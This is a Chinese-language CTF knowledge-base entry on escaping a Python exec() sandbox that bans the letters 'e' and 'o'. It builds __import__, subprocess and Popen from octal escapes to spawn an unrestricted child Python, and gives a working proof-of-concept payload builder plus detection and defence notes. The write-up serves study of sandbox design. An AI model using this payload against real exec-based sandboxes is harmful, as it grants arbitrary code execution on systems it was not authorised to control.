---
id: binary-pwn-sandbox-escape-python-eo-blacklist-octal-subprocess
title: Python exec 沙箱禁 e/o：八进制转义拼 __import__ 并拉起无限制子 Python
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-jail-charset-octal-bypass
tags:
- python
- pyjail
- sandbox-escape
- charset-blacklist
- octal-escape
- subprocess
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:11:10+08:00'
  notes: 已对照原文 bctf-infra chal1 段核对：白名单为小写+标点+数字去 e/o、exec(inp)、八进制拼 __import__/subprocess/Popen 并拉起无限制子 Python，payload 与原文一致；未在远端复跑；原文未标注版本。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-python-eo-blacklist-octal-subprocess/
draft: false
kb_aliases:
- 禁 e/o 的 pyjail
- 八进制转义 pyjail
- 有限字符集 exec
- __builtins__.__dict__ 取 import
---

## 一句话结论

当 `exec(inp)` 的沙箱只按原始字符过滤、禁止字母 `e` 和 `o` 时，源码里不出现这两个字母并不妨碍执行：用八进制转义（如 `\137\137\151...`）在字符串运行时拼出 `__import__`、`subprocess`、`Popen`，再通过 `__builtins__.__dict__` 取出 import，即可拉起一个不受字符集限制的子 Python 执行完整利用代码。

## 原理

- 过滤发生在源码层：`for c in inp: if c not in allowed_chars: exit()`，它只检查输入字符串的字符，不检查运行时由转义序列生成的字符串内容。
- Python 字符串字面量中的 `\137` 是 `_`、`\151` 是 `i`、`\155` 是 `m` 等；把敏感标识符整体写成八进制转义，源码中就不会出现被禁的 `e`/`o`。
- `exec` 的全局命名空间中通常仍有 `__builtins__`（模块的内建字典或模块对象），可通过 `__builtins__.__dict__['__import__']` 取得 import 函数，再用它导入 `sys` 与 `subprocess`。
- `subprocess.Popen([sys.executable, '-u', '-c', CHILD_CODE])` 启动新的 Python 进程；外层输入限制只作用于第一层 `exec`，子进程的 `-c` 参数不经过该过滤，因此可以执行任意 Python。
- 该技巧把“有限字符集”降级为“只需能构造出一次 Popen 调用”，后续逻辑完全自由。

## 触发条件

- 沙箱直接 `exec` 用户输入，字符白名单不含 `e`、`o`（或类似的少量字母）。
- 运行时仍能访问 `__builtins__`/`__import__`，未做进程级隔离或 AST 白名单。
- 允许使用引号、反斜杠、括号、点号等构造转义字符串与调用。

## 利用步骤

1. 确认白名单：小写字母、标点、数字，但 `e`/`o` 被剔除。
2. 写八进制编码函数 `oq(s)`，把 `__import__`、`subprocess`、`Popen`、`executable` 等转成 `\ooo` 序列。
3. 构造外层 payload：`i=__builtins__.__dict__['<octal __import__>']; s=i('sys'); p=i('<octal subprocess>'); p.__dict__['<octal Popen>']([s.__dict__['<octal executable>'],'-u','-c','<octal CHILD>'])`。
4. 断言 payload 中不含 `e`/`o`，发送；子进程执行真正的利用代码。
5. 子进程内可自由使用任意字符，继续读文件、起线程、连本地服务等。

## PoC

```python
def oq(s: str) -> str:
    return ''.join(f'\\{b:03o}' for b in s.encode())

payload = (
    "i=__builtins__.__dict__['" + oq("__import__") + "'];"
    "s=i('sys');"
    "p=i('" + oq("subprocess") + "');"
    "p.__dict__['" + oq("Popen") + "']([s.__dict__['" + oq("executable") + "'],'-u','-c','" + oq(CHILD_CODE) + "'])"
)
assert 'e' not in payload and 'o' not in payload
```

## 变体与关联

- 用 `\x5f\x5f...` 十六进制转义、`bytes.fromhex(...).decode()`、`chr()` 拼接等等价方式绕过字符黑名单。
- 若 `__builtins__` 被清空，可改用函数对象的 `__globals__` 恢复（见 [[binary-pwn-sandbox-escape-python-set-builtin-fake-import-globals]]）。
- 关联：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]（eval 黑名单）、[[web-python-ssti-bottle-unicode-octal-walrus-bypass]]（八进制转义在 SSTI 中的用法）。

## 检测与防御

- 检测：payload 中出现大量 `\ooo` 转义、`__builtins__.__dict__`、`subprocess`、`Popen`、`executable`；短输入中异常高的反斜杠密度。
- 防御：不要只做字符黑名单；使用 AST 白名单/受限解释器；进程级隔离与 seccomp；禁止 `exec` 用户输入。
